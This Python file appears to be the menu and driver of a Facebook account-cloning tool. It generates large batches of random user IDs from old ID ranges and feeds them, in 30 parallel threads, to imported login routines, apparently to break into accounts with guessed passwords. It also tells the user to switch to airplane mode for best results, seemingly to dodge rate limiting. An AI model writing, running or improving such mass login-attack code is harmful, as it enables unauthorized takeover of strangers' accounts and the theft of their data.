import os
import sys
import random
import time
from concurrent.futures import ThreadPoolExecutor as tred
from config import (rad, Y, G, W, CY, BL, RESET, DIM,
                    TOOL_NAME, TOOL_VERSION, TOOL_AUTHOR,
                    TOOL_FB, TOOL_GITHUB, TOOL_TG)
from utils import linex
from login import login_1, login_2


def _box_line(char='━', color='\x1b[38;5;240m', length=47):
    print(f"{color}{char * length}{RESET}")


def banner():
    os.system('cls' if 'win' in sys.platform else 'clear')
    print(f"""
{CY}  ██╗  ██╗ █████╗ ██████╗ ██████╗  ██████╗
{CY}  ██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗
{G}  █████╔╝ ███████║██████╔╝██████╔╝██║   ██║
{G}  ██╔═██╗ ██╔══██║██╔══██╗██╔══██╗██║   ██║
{Y}  ██║  ██╗██║  ██║██████╔╝██████╔╝╚██████╔╝
{Y}  ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝{RESET}
{DIM}  ─────────────────────────────────────────────{RESET}
  {W}Tool{RESET}     {DIM}│{RESET}  {G}{TOOL_NAME} {TOOL_VERSION}{RESET}
  {W}Author{RESET}   {DIM}│{RESET}  {Y}{TOOL_AUTHOR}{RESET}
  {W}Facebook{RESET} {DIM}│{RESET}  {CY}{TOOL_FB}{RESET}
  {W}GitHub{RESET}   {DIM}│{RESET}  {CY}{TOOL_GITHUB}{RESET}
  {W}Telegram{RESET} {DIM}│{RESET}  {CY}{TOOL_TG}{RESET}
{DIM}  ─────────────────────────────────────────────{RESET}
  {G}✦  WIFI + MOBILE DATA SUPPORTED{RESET}
{DIM}  ─────────────────────────────────────────────{RESET}""")


def _menu_item(key, label):
    print(f"  {CY}[{W}{key}{CY}]{RESET}  {G}{label}{RESET}")


def _prompt(label):
    return input(f"\n  {CY}❯{RESET} {W}{label}{RESET} : {Y}").strip()


def BNG_71_():
    banner()
    print(f"\n  {W}SELECT MODULE{RESET}")
    _box_line()
    _menu_item('A', 'OLD CLONE')
    _box_line()
    choice = _prompt('CHOOSE')
    if choice.upper() in ('A', '1'):
        old_clone()
    else:
        print(f"\n  {rad}✘  Invalid option.{RESET}")
        time.sleep(1.5)
        BNG_71_()


def old_clone():
    banner()
    print(f"\n  {W}SELECT SERIES{RESET}")
    _box_line()
    _menu_item('A', 'ALL SERIES')
    _menu_item('B', '100003 / 100004 SERIES')
    _menu_item('C', '2009 SERIES')
    _box_line()
    choice = _prompt('CHOOSE')
    if choice.upper() in ('A', '1'):
        old_One()
    elif choice.upper() in ('B', '2'):
        old_Tow()
    elif choice.upper() in ('C', '3'):
        old_Tree()
    else:
        print(f"\n  {rad}✘  Invalid option.{RESET}")
        time.sleep(1.5)
        BNG_71_()


def _select_method():
    print(f"\n  {W}SELECT METHOD{RESET}")
    _box_line()
    _menu_item('A', 'METHOD 1')
    _menu_item('B', 'METHOD 2')
    _box_line()
    return _prompt('METHOD (A/B)').upper()


def _run_pool(user_list, meth, star=''):
    banner()
    _box_line()
    print(f"  {W}Total IDs  {RESET}{DIM}│{RESET}  {G}{len(user_list)}{RESET}")
    print(f"  {W}Method     {RESET}{DIM}│{RESET}  {G}{meth}{RESET}")
    print(f"  {W}Tip        {RESET}{DIM}│{RESET}  {Y}Use Airplane Mode for best results{RESET}")
    _box_line()
    with tred(max_workers=30) as pool:
        for item in user_list:
            uid = star + item if star else item
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"  {rad}✘  Invalid method.{RESET}")
                break


def old_One():
    user = []
    banner()
    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}2010 – 2014{RESET}")
    _box_line()
    ask   = _prompt('SERIES SELECT')
    limit = _prompt('TOTAL IDs  (e.g. 20000)')
    star  = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    meth = _select_method()
    _run_pool(user, meth, star)


def old_Tow():
    user = []
    banner()
    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}100003 / 100004 SERIES{RESET}")
    _box_line()
    _prompt('SERIES SELECT')
    limit = _prompt('TOTAL IDs  (e.g. 20000)')
    for _ in range(int(limit)):
        prefix = random.choice(['100003', '100004'])
        uid    = prefix + ''.join(random.choices('0123456789', k=9))
        user.append(uid)
    meth = _select_method()
    _run_pool(user, meth)


def old_Tree():
    user = []
    banner()
    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}2009 – 2010 SERIES{RESET}")
    _box_line()
    _prompt('SERIES SELECT')
    limit = _prompt('TOTAL IDs  (e.g. 20000)')
    for _ in range(int(limit)):
        uid = '1000004' + ''.join(random.choices('0123456789', k=8))
        user.append(uid)
    meth = _select_method()
    _run_pool(user, meth)
